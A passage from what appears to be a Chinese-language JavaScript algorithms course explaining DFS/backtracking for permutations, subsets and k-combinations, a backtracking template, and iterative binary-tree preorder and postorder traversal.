              visited[nums[i]] = <span class="hljs-number">1</span>
              <span class="hljs-comment">// 将nums[i]推入当前排列</span>
              curr.<span class="hljs-title function_">push</span>(nums[i])
              <span class="hljs-comment">// 基于这个排列继续往下一个坑走去</span>
              <span class="hljs-title function_">dfs</span>(nth+<span class="hljs-number">1</span>) 
              <span class="hljs-comment">// nums[i]让出当前坑位</span>
              curr.<span class="hljs-title function_">pop</span>()
              <span class="hljs-comment">// 下掉“已用过”标识</span>
              visited[nums[i]] = <span class="hljs-number">0</span>
          }
      }
  }
  <span class="hljs-comment">// 从索引为 0 的坑位（也就是第一个坑位）开始 dfs</span>
  <span class="hljs-title function_">dfs</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">return</span> res
};
</code></pre>
<p><a name="user-content-wN075" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-40">小贴士  </h3>
<p>上面这坨代码里，有两个点需要大家格外注意，它们将会成为我们以后做类似题目的关键技巧：   </p>
<ol>
<li>Map 结构 <code>visited</code>  的使用：填坑时，每用到一个数字，我们都要给这个数字打上“已用过”的标——避免它被使用第二次；数字让出坑位时，对应的排列和 <code>visited</code>  状态也需要被及时地更新掉。</li>
<li>当走到递归边界时，一个完整的排列也到手了。将这个完整排列推入结果数组时，我们用了 <code> res.push(curr.slice())</code> 而不是简单的 <code>res.push(curr)</code> 。为什么这样做？因为全局只有一个唯一的 <code>curr</code> ， <code>curr</code> 的值会随着 <code>dfs</code> 的进行而不断被更新。 <code>slice</code> 方法的作用是帮助我们拷贝出一个不影响<code>curr</code>正本的副本，以防直接修改到<code>curr</code>的引用。</li>
</ol>
<br/>
<br/>带着全排列问题教会我们的解题思路和编码技巧，我们再来看另一个类型的题目——组合问题。  <br/> <br/>
<h2 data-id="heading-41">组合问题：变化的“坑位”，不变的“套路”</h2>
<blockquote>
<p>题目描述：给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。<br/>
说明：解集不能包含重复的子集。</p>
</blockquote>
<blockquote>
<p>示例:
输入: nums = [1,2,3]<br/>
输出:<br/>
[<br/>
[3],<br/>
[1],<br/>
[2],<br/>
[1,2,3],<br/>
[1,3],<br/>
[2,3],<br/>
[1,2],<br/>
[]<br/>
]</p>
</blockquote>
<h3 data-id="heading-42">思路分析</h3>
<p>见到这道题，大家第一反应会是什么？吸取了上一道题的经验，这道题我们应该想到的是：<strong>穷举出现了，大概率会用到 DFS</strong>。<br/>
只要用到 DFS，就不得不想到<strong>树形思维方式</strong>，进而不得不思考递归式和递归边界的问题。在这个思考的过程中，最重要的一环就是<strong>对“坑位”的定位和分析。</strong><br/>从上一道题中，我们不难看出，“坑位”对应的就是树形逻辑中树的某一层，“坑位数”往往意味着递归边界的限制条件。   <br/>  <br/>找“坑位”的思路也是具有规律的：“坑位”往往是那些不会变化的东西。在上一道题中，排列的顺序是变化的，而每个排列中数字的个数却是不变的，因此数字的个数就对应“坑位”的个数；在这道题中，每个组合中数字的个数是不确定的，不变的东西变成了<strong>可以参与组合的数字</strong>，变化的东西则是每个数字在组合中的<strong>存在性</strong>。因此我们的思路可以调整为，<strong>从每一个数字入手，讨论它出现或者不出现的情况</strong>。 </p>
<p>换汤不换药，这里我们仍然采取树形思维模型：   <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a25410cf07~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1300&amp;h=942&amp;s=111924&amp;e=png&amp;b=ffffff" alt="image.png" loading="lazy"/><br/>为了使存在性凸显得更具体，这里我直接把树形结构中每一层对应的可能组合给大家列出来：  </p>
<pre><code class="hljs language-javascript" lang="javascript">root                                            []                  
数字<span class="hljs-number">1</span>——第一层                     <span class="hljs-number">1</span>                                   []
数字<span class="hljs-number">2</span>——第二层            [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]            [<span class="hljs-number">1</span>]                   [<span class="hljs-number">2</span>]         []
数字<span class="hljs-number">3</span>———第三层    [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]     [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]  [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]   [<span class="hljs-number">1</span>]           [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]   [<span class="hljs-number">2</span>]   [<span class="hljs-number">3</span>]  []
</code></pre>
<p>从 <code>root</code>  出发，每一个数字对应树的一层，<strong>存在或不存在对应树的两个分叉</strong>。从第一层到第三层，我们得到的所有完整路径，就是 3 个数的所有可能的组合形式。  <br/> <br/>我们分析一下这个过程中的递归式与递归边界：  </p>
<ul>
<li><strong>递归式</strong>：检查手里剩下的数字有哪些（有没有发现和上一道题的递归式是一样的，因为两道题都强调了数字不能重复使用），选取其中一个填进当前的坑里、或者干脆把这个坑空出来（这里就体现出了和上一道题的区别，这道题强调的是存在性而非顺序）。  </li>
<li><strong>递归边界</strong>：组合里数字个数的最大值。拿示例来说，只给了 3 个数，因此组合里数字最多也只有 3 个，超过 3 个则视为触碰递归边界。  </li>
</ul>
<p><br/>按照这个思路，可以编码如下：  <br/>   <a name="user-content-NjlCx" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-43">编码实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[][]</span>}
 */</span>
<span class="hljs-comment">// 入参是一个数组</span>
<span class="hljs-keyword">const</span> subsets = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) {
    <span class="hljs-comment">// 初始化结果数组</span>
    <span class="hljs-keyword">const</span> res = []   
    <span class="hljs-comment">// 缓存数组长度</span>
    <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>
    <span class="hljs-comment">// 初始化组合数组</span>
    <span class="hljs-keyword">const</span> subset = []
    <span class="hljs-comment">// 进入 dfs</span>
    <span class="hljs-title function_">dfs</span>(<span class="hljs-number">0</span>)  

    <span class="hljs-comment">// 定义 dfs 函数，入参是 nums 中的数字索引</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">index</span>) {
        <span class="hljs-comment">// 每次进入，都意味着组合内容更新了一次，故直接推入结果数组</span>
        res.<span class="hljs-title function_">push</span>(subset.<span class="hljs-title function_">slice</span>())
        <span class="hljs-comment">// 从当前数字的索引开始，遍历 nums</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=index;i&lt;len;i++) {
            <span class="hljs-comment">// 这是当前数字存在于组合中的情况</span>
            subset.<span class="hljs-title function_">push</span>(nums[i]) 
            <span class="hljs-comment">// 基于当前数字存在于组合中的情况，进一步 dfs</span>
            <span class="hljs-title function_">dfs</span>(i+<span class="hljs-number">1</span>)
            <span class="hljs-comment">// 这是当前数字不存在与组合中的情况</span>
            subset.<span class="hljs-title function_">pop</span>()
        }
    }
    <span class="hljs-comment">// 返回结果数组</span>
    <span class="hljs-keyword">return</span> res 
};
</code></pre>
<p><a name="user-content-gW7Nk" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-44">编码复盘 </h3>
<p>这道题和上一道题的基本思路高度一致，但是在实现上有些差别。对初学者来说，即便是非常微小的变化也有可能引起困惑。因此，我在这里针对编码部分变化的内容作进一步讲解： <br/></p>
<ul>
<li>递归式的变化：在上一道题中，我们检查一个数字是否可用的依据是它是否已被纳入当前排列（ <code>visited</code> 值是否为 1），而这道题中，并不存在一个类似 <code>visited</code> 一样的标记对象。取而代之的，是每次直接以 <code>index</code> 作为了索引起点。这是因为，在排列场景下，一个元素可能出现在任何坑位里；而在组合场景下，坑位的选择逻辑发生了变化，坑位和元素是一一对应的。因此讨论完一个坑位的取舍后，一个元素的取舍也相应地讨论完毕了，直接跳过这个元素的索引往下走即可。</li>
<li>递归边界的变化：这道题中，并没有显式的 <code>return</code> 语句来标示递归边界的存在。这个边界的判定被 <code>for</code> 语句偷偷地做掉了： <code>for</code> 语句会遍历所有的数字，当数字遍历完全时，也就意味着递归走到了尽头。<br/></li>
</ul>
<br/>
<p><a name="user-content-BkLyC" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-45">限定组合问题：及时回溯，即为“剪枝”  </h2>
<blockquote>
<p>题目描述：给定两个整数 n 和 k，返回 1 ... n 中所有可能的 k 个数的组合。</p>
</blockquote>
<blockquote>
<p>示例:
输入: n = 4, k = 2<br/>
输出:<br/>
[<br/>
[2,4],<br/>
[3,4],<br/>
[2,3],<br/>
[1,2],<br/>
[1,3],<br/>
[1,4],<br/>
]</p>
</blockquote>
<p><a name="user-content-v6ZzY" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-46">思路分析</h3>
<p>这是一道复杂化的组合问题，它追加了一个限定条件——只返回 n 个数中 k 个数的组合。在普通的组合问题中，树形逻辑是这样的：  <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a25410cf07~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1300&amp;h=942&amp;s=111924&amp;e=png&amp;b=ffffff" alt="image.png" loading="lazy"/><br/> <br/>而在这道题里，树形逻辑被“截胡”了，它要求我们只输出其中的一部分。假如 n=3， k=2，那么需要输出的内容就如下图的红色箭头所示：   <br/>  <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a254223576~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1274&amp;h=934&amp;s=125132&amp;e=png" alt="image.png" loading="lazy"/><br/> <br/>我们发现，只有双向箭头所指的结点组合被认为是有效结果，其它结点都被丢弃了。在寻找这三对结点组合的过程中，我们一旦找到一对，就停止继续往深处搜索，这就意味着一些结点压根没有机会被遍历到。<br/> <br/>这其实就是“剪枝”的过程——在深度优先搜索中，<strong>有时我们会去掉一些不符合题目要求的、没有作用的答案，进而得到正确答案。这个丢掉答案的过程，形似剪掉树的枝叶，所以这一方法被称为“剪枝”</strong>。   <br/> <br/>在这道题中，要做到剪枝，我们需要分别在组合问题的递归式和递归边界上动手脚：</p>
<ul>
<li>递归式：普通组合问题，每到一个新的坑位处，我们都需要对组合结果数组进行更新；这道题中，当且仅当组合内数字个数为 <code>k</code> 个时，才会对组合结果数组进行更新。</li>
<li>递归边界：只要组合内数字个数达到了 <code>k</code> 个，就不再继续当前的路径往下遍历，而是直接返回。</li>
</ul>
<p>  <br/> <br/>基于这两个改造点，我们可以编码如下：   <br/>   <a name="user-content-W7wvf" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-47">编码实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">n</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">k</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[][]</span>}
 */</span>
<span class="hljs-keyword">const</span> combine = <span class="hljs-keyword">function</span>(<span class="hljs-params">n, k</span>) {
   <span class="hljs-comment">// 初始化结果数组</span>
    <span class="hljs-keyword">const</span> res = []   
    <span class="hljs-comment">// 初始化组合数组</span>
    <span class="hljs-keyword">const</span> subset = []
    <span class="hljs-comment">// 进入 dfs，起始数字是1</span>
    <span class="hljs-title function_">dfs</span>(<span class="hljs-number">1</span>)  

    <span class="hljs-comment">// 定义 dfs 函数，入参是当前遍历到的数字</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">index</span>) {
        <span class="hljs-keyword">if</span>(subset.<span class="hljs-property">length</span> === k) {
            res.<span class="hljs-title function_">push</span>(subset.<span class="hljs-title function_">slice</span>())
            <span class="hljs-keyword">return</span> 
        }
        <span class="hljs-comment">// 从当前数字的值开始，遍历 index-n 之间的所有数字</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=index;i&lt;=n;i++) {
            <span class="hljs-comment">// 这是当前数字存在于组合中的情况</span>
            subset.<span class="hljs-title function_">push</span>(i) 
            <span class="hljs-comment">// 基于当前数字存在于组合中的情况，进一步 dfs</span>
            <span class="hljs-title function_">dfs</span>(i+<span class="hljs-number">1</span>)
            <span class="hljs-comment">// 这是当前数字不存在与组合中的情况</span>
            subset.<span class="hljs-title function_">pop</span>()
        }
    }
    <span class="hljs-comment">// 返回结果数组</span>
    <span class="hljs-keyword">return</span> res 
};
</code></pre>
<p>注意这道题中虽然没有直接给出一个 <code>nums</code> 数组，而是直接约定了数字的范围为 <code>1-n</code> ，但其本质仍然是一个数字集合，我们像上面这样稍微调整下取值方式即可。</p>
<h2 data-id="heading-48">概念复盘：何为“回溯”？  </h2>
<p>现在，或许你还暂时不知道何为“回溯算法”，但你其实已经实打实地在真题中对它有了具体的实践。基于这些实践，我们反过来理解一下回溯的概念：</p>
<blockquote>
<p>回溯算法实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就 “回溯” 返回，尝试别的路径。<br/>
回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为 “回溯点”。<br/>
许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。<br/>
回溯算法的基本思想是：从一条路往前走，能进则进，不能进则退回来，换一条路再试。  ——LeetCode</p>
</blockquote>
<p>我们重点关注这句话：“回溯算法的基本思想是：从一条路往前走，能进则进，不能进则退回来，换一条路再试。”   <br/>  <br/>有没有发现，这个“回溯算法”和上一节的 <code>DFS</code> ，好像翻来覆去是在讲同一件事情？   <br/>实际上，这里的“回溯”二字，大家可以理解为是在强调 <code>DFS</code> 过程中“退一步重新选择”这个动作。这样想的话， <code>DFS</code> 算法其实就是回溯思想的体现。      <br/> <br/>这里顺便给大家提个醒：一些同学在平时的刷题和面试中，会因为对“回溯”的定义感到困惑，进而拼命地钻牛角尖，这样的做法是非常不可取的。<br/>
早年笔者有过一段短暂的 ACMer 生涯，彼时关于回溯，老师曾经给出过一个这样的解读：“在我们接下来要应对的题目里，有递归就会有回溯。回溯算法的特别之处，在于其对应的题目往往要求你在递归过程中求出一个确切的解”。后来笔者自己乱七八糟地读了一堆算法相关的“名著”，其中又有一本书这样定义回溯：“涉及剪枝操作的递归，我们一般称之为回溯”。    <br/>  <br/>大家会发现，关于回溯算法的定义，可以说是仁者见仁、智者见智。这也是我不建议大家从概念入手去学算法的一个原因——反复纠结文字游戏，无法给你带来任何实质上的能力提升。在实际面试中，没有一个面试官会要求你默写算法的定义，他关注的一定是你的解题思路和编码内容——什么都是浮云，能把题做出来，才是王道！<br/></p>
<p><a name="user-content-Ph6KJ" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-49">递归与回溯问题——解题模板总结</h2>
<p>做完了楼上三道典型例题，相信大家此时都有了一些微妙的感觉——这三道题的解题方法是非常相似的，是不是意味着涉及递归回溯、或者说涉及 <code>DFS</code> 应用的题目，都有某种共通之处呢？会不会存在某种解题套路，可以帮助我们知一解百、举一反 N 呢？   <br/>能想到这一层的老铁，我要给你双击一个巨大的 666——善于总结，积极寻找题目与题目之间的关联，尝试发掘题目中反映出来的规律，这都是非常棒的学习习惯。   <br/>  <br/>对于递归回溯系列的问题，笔者自己在刷题过程中总结出了一套模板。在这套模板的引导下，笔者至今还没有在递归回溯问题上翻过车。在这里我和大家分享这套模板，同时也希望各位在身经百战之后，能够针对不同类型的问题，尝试去总结一套属于你自己的解题模板。     <br/>  <br/>如何总结出一套解题模板？其实很简单，大家只需要搞清楚三个问题：   </p>
<ol>
<li>什么时候用？（明确场景）</li>
<li>为什么这样用？（提供依据）</li>
<li>怎么用？（细化步骤）</li>
</ol>
<p><br/>拿这个专题来说，我给出的解题模板内容如下：  <br/></p>
<p><a name="user-content-HbP9b" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-50">什么时候用</h4>
<p>看两个特征：</p>
<ol>
<li>题目中暗示了一个或多个解，并且要求我们详尽地列举出每一个解的内容时，一定要想到 DFS、想到递归回溯。  </li>
<li>题目经分析后，可以转化为树形逻辑模型求解。</li>
</ol>
<p><strong>为什么这样用</strong><br/>递归与回溯的过程，本身就是穷举的过程。题目中要求我们列举每一个解的内容，解从哪来？解是基于穷举思想、对搜索树进行恰当地剪枝后得来的。   <br/></p>
<pre><code class="hljs language-!" lang="!">这里需要大家注意到另一种问法：不问解的内容，只问解的个数。这类问题往往不用 DFS 来解，而是用动态规划（我们后面会学）。这里，大家先记下这个辨析，对以后做题会有帮助。
</code></pre>
<p><strong>怎么用</strong><br/>一个模型——树形逻辑模型；两个要点——递归式和递归边界。<br/>树形逻辑模型的构建，关键在于找“坑位”，一个坑位就对应树中的一层，每一层的处理逻辑往往是一样的，这个逻辑就是递归式的内容。至于递归边界，要么在题目中约束得非常清楚、要么默认为“坑位”数量的边界。  <br/>用伪代码总结一下编码形式，大部分的题解都符合以下特征：  </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xxx</span>(<span class="hljs-params">入参</span>) {
  前期的变量定义、缓存等准备工作 
  
  <span class="hljs-comment">// 定义路径栈</span>
  <span class="hljs-keyword">const</span> path = []
  
  <span class="hljs-comment">// 进入 dfs</span>
  <span class="hljs-title function_">dfs</span>(起点) 
  
  <span class="hljs-comment">// 定义 dfs</span>
  <span class="hljs-title function_">dfs</span>(<span class="hljs-params">递归参数</span>) {
    <span class="hljs-keyword">if</span>(到达了递归边界) {
      结合题意处理边界逻辑，往往和 path 内容有关
      <span class="hljs-keyword">return</span>   
    }
    
    <span class="hljs-comment">// 注意这里也可能不是 for，视题意决定</span>
    <span class="hljs-keyword">for</span>(遍历坑位的可选值) {
      path.<span class="hljs-title function_">push</span>(当前选中值)
      处理坑位本身的相关逻辑
      path.<span class="hljs-title function_">pop</span>()
    }
  }
}
</code></pre>
<p>在面试中，如果你隐约觉得这道题用递归回溯来解可能有戏，却一时间没办法明确具体的解法，那么不妨尝试把这段伪代码记在脑子里。在面试时，先把框架写出来，然后结合题意去调整和填充伪代码的内容——很多时候，我们做题缺的不是知识储备，而是一个具体的切入点。</p>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）</p>
<p>二叉树在面试实战中，花样非常多。本节只是个开头，在后面几个专题、包括最后的大厂真题实战环节中，我们都不会停止对二叉树相关考点的学习和探讨。</p>
<p>在本节，有以下三个命题方向需要大家重点掌握：  </p>
<ul>
<li>迭代法实现二叉树的先、中、后序遍历 </li>
<li>二叉树层序遍历的衍生问题</li>
<li>翻转二叉树 </li>
</ul>
<p><br/>这三个方向对应的考题都比较经典。与此同时，解决这些问题涉及到的思路和编码细节，也会成为各位日后解决更加复杂的问题的基石。因此，虽然本节篇幅略长，但还是希望各位能够倾注耐心，给自己充分的时间去理解和消化这些知识。 <a name="user-content-zIY0u" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-51">“遍历三兄弟”的迭代实现  </h2>
<p>经过第5节的学习，相信各位已经将二叉树先、中、后序遍历的递归实现吃得透透的了。在使用递归实现遍历的过程中，我们明显察觉到，“遍历三兄弟”的编码实现也宛如孪生兄弟一样，彼此之间只有代码顺序上的不同，整体内容基本是一致的。这正是递归思想的一个重要的优点——简单。</p>
<p>这里的“简单”并不是说学起来简单。相反，结合笔者早期的读者调研来看，大部分同学都认为递归学起来让人很难受（这也是正常的）。<br/>
初学递归的人排斥递归，大部分是出于对“函数调用自身”这种骚操作的不适应。但只要你能克服这种不适应，并且通过反复的演练去吸收这种解题方法，你就会发现递归真的是个好东西。因为通过使用递归，我们可以把原本复杂的东西，拆解成非常简单的、符合人类惯用脑回路的逻辑。</p>
<p>这样说可能还是有点抽象，不过没关系，接下来我会讲解“遍历三兄弟”对应的迭代解法。等我们学完这坨东西之后，心怀疑惑的同学不妨拿迭代法的代码和第5节中递归法的代码比较一下，相信你会毫不犹豫地回头对递归说上一句“真香！”。</p>
<h3 data-id="heading-52">从先序遍历说起</h3>
<p>  </p>
<blockquote>
<p>题目描述：给定一个二叉树，返回它的前序（先序）遍历序列。</p>
</blockquote>
<blockquote>
<p>示例:
输入: [1,null,2,3]</p>
</blockquote>
<pre><code class="hljs">1   
 \   
  2   
 /  
3 
</code></pre>
<blockquote>
<p>输出: [1,2,3]<br/>
进阶: 递归算法很简单，你可以通过迭代算法完成吗？</p>
</blockquote>
<p><a name="user-content-JJ7OY" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-53">思路分析</h4>
<p>注意最后那一行小字：“递归算法很简单，你可以通过迭代算法完成吗？”，对递归算法有疑问的同学，趁这个机会赶紧复习下第五小节，本节我们只讲迭代法。   <br/>前面两个小节，我们一直在强调，递归和栈有着脱不开的干系。当一道本可以用递归做出来的题，突然不许你用递归了，此时我们本能的反应，就应该是往栈上想。   <br/>  <br/>在基于栈来解决掉这个题之前，我要先跟平时用 <code>leetcode</code> 刷题的各位强调一个常识。</p>
<p>现在大家回头看这道题目给我们的<strong>输入</strong>和<strong>输出</strong>：输入看似是一个数组，实则不是。大家谨记，二叉树题目的输入只要没有额外强调，那么一般来说它都是基于这样的一个对象结构嵌套而来的：   </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TreeNode</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">left</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">right</span> = <span class="hljs-literal">null</span>;
}
</code></pre>
<p>比如这样： </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> root = {
  <span class="hljs-attr">val</span>: <span class="hljs-string">"A"</span>,
  <span class="hljs-attr">left</span>: {
    <span class="hljs-attr">val</span>: <span class="hljs-string">"B"</span>,
    <span class="hljs-attr">left</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"D"</span>
    },
    <span class="hljs-attr">right</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"E"</span>
    }
  },
  <span class="hljs-attr">right</span>: {
    <span class="hljs-attr">val</span>: <span class="hljs-string">"C"</span>,
    <span class="hljs-attr">right</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"F"</span>
    }
  }
};
</code></pre>
<p>话说回来，为啥题上给的不是对象，而是这样的一个数组呢： </p>
<pre><code class="hljs language-javascript" lang="javascript">[<span class="hljs-number">1</span>,<span class="hljs-literal">null</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]
</code></pre>
<p>这其实是一种简化的写法，性质跟咱们写伪代码差不多。它的作用主要是描述二叉树的值，至于二叉树的结构，我们以题中给出的树形结构为准：  </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1</span>
  \
   <span class="hljs-number">2</span>
  /
<span class="hljs-number">3</span>
</code></pre>
<p><br/>OK，了解了输入内容，现在再来看输出：  </p>
<pre><code class="hljs language-javascript" lang="javascript">[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]
</code></pre>
<p>这里这个输出就简单多了，它是一个<strong>真数组</strong>。为什么可以判断它是一个真数组呢？因为题目中要求你输出的是一个遍历序列，而不是一个<strong>二叉树</strong>。因此大家最后需要塞入结果数组的不是结点对象，而是结点的值。</p>
<pre><code class="hljs language-!" lang="!">注意：       
以上的出参入参规律，是针对 leetcode 及其周边 OJ 来说的。OJ 中这样编写题目描述，是情理之中，因为 OJ 本身是支持多语言的，它只能对最通用的一部分信息进行透出。在面试场景下，不排除一些公司可能会贴心地把 JS 版本的出参和入参给出来，但更多的还是会直接复制粘贴 leetcode 或者其它一些算法书中的原题。如果你对题目的出参和入参有疑问，请大胆地对面试官说出你的困惑——没有一个正常面试官会在题目描述上为难你， 他比你更急切地想看到你刷刷写代码的英姿。    
</code></pre>
<p>回到题目上来。我们接着栈往下说，题目中的出参是一个数组，大家仔细看这个数组，它像不像是一个栈的出栈序列？实际上，做这道题的一个根本思路，就是通过<strong>合理地安排入栈和出栈的时机、使栈的出栈序列符合二叉树的前序遍历规则</strong>。   <br/><br/>
前序遍历的规则是，先遍历根结点、然后遍历左孩子、最后遍历右孩子——这正是我们所期望的出栈序列。按道理，入栈序列和出栈序列相反，我们似乎应该按照 <code>右-&gt;左-&gt;根</code> 这样的顺序将结点入栈。不过需要注意的是，我们遍历的起点就是根结点，难道我们要假装没看到这个根结点、一鼓作气找到最右侧结点之后才开始进行入栈操作吗？答案当然是否定的，我们的出入栈顺序应该是这样的：  </p>
<ol>
<li>将根结点入栈 </li>
<li>取出栈顶结点，将结点值 <code>push</code> 进结果数组 </li>
<li>若栈顶结点有右孩子，则将右孩子入栈</li>
<li>若栈顶结点有左孩子，则将左孩子入栈</li>
</ol>
<p><br/>这整个过程，本质上是将当前子树的根结点入栈、出栈，随后再将其对应左右子树入栈、出栈的过程。</p>
<p>重复 2、3、4 步骤，直至栈空，我们就能得到一个先序遍历序列。    <br/>   <a name="user-content-0POAX" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-54">编码实现  </h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-keyword">const</span> preorderTraversal = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-comment">// 定义结果数组</span>
  <span class="hljs-keyword">const</span> res = []  
  <span class="hljs-comment">// 处理边界条件</span>
  <span class="hljs-keyword">if</span>(!root) {
      <span class="hljs-keyword">return</span> res
  }
  <span class="hljs-comment">// 初始化栈结构</span>
  <span class="hljs-keyword">const</span> stack = [] 
  <span class="hljs-comment">// 首先将根结点入栈</span>
  stack.<span class="hljs-title function_">push</span>(root)  
  <span class="hljs-comment">// 若栈不为空，则重复出栈、入栈操作</span>
  <span class="hljs-keyword">while</span>(stack.<span class="hljs-property">length</span>) {
      <span class="hljs-comment">// 将栈顶结点记为当前结点</span>
      <span class="hljs-keyword">const</span> cur = stack.<span class="hljs-title function_">pop</span>() 
      <span class="hljs-comment">// 当前结点就是当前子树的根结点，把这个结点放在结果数组的尾部</span>
      res.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">val</span>)
      <span class="hljs-comment">// 若当前子树根结点有右孩子，则将右孩子入栈</span>
      <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">right</span>) {
          stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">right</span>)
      }
      <span class="hljs-comment">// 若当前子树根结点有左孩子，则将左孩子入栈</span>
      <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">left</span>) {
          stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">left</span>)
      }
  }
  <span class="hljs-comment">// 返回结果数组</span>
  <span class="hljs-keyword">return</span> res
};
</code></pre>
<p>   <a name="user-content-WRdHJ" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-55">异曲同工的后序遍历迭代实现     </h3>
<p><a name="user-content-a1s7V" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h4 data-id="heading-56">思路分析</h4>
<p>后序遍历的出栈序列，按照规则应该是 <code>左 -&gt; 右 -&gt; 根</code> 。这个顺序相对于先序遍历，最明显的变化就是根结点的位置从第一个变成了倒数第一个。   <br/>如何做到这一点呢？与其从 <code>stack</code> 这个栈结构上入手，不如从 <code>res</code> 结果数组上入手：我们可以直接把 <code>pop</code> 出来的当前结点 <code>unshift</code> 进 <code>res</code> 的头部，改造后的代码会变成这样： </p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">while</span>(stack.<span class="hljs-property">length</span>) {
  <span class="hljs-comment">// 将栈顶结点记为当前结点</span>
  <span class="hljs-keyword">const</span> cur = stack.<span class="hljs-title function_">pop</span>() 
  <span class="hljs-comment">// 当前结点就是当前子树的根结点，把这个结点放在结果数组的头部</span>
  res.<span class="hljs-title function_">unshift</span>(cur.<span class="hljs-property">val</span>)
  <span class="hljs-comment">// 若当前子树根结点有右孩子，则将右孩子入栈</span>
  <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">right</span>) {
    stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">right</span>)
  }
  <span class="hljs-comment">// 若当前子树根结点有左孩子，则将左孩子入栈</span>
  <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">left</span>) {
    stack.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">left</span>)
  }
}
</code></pre>
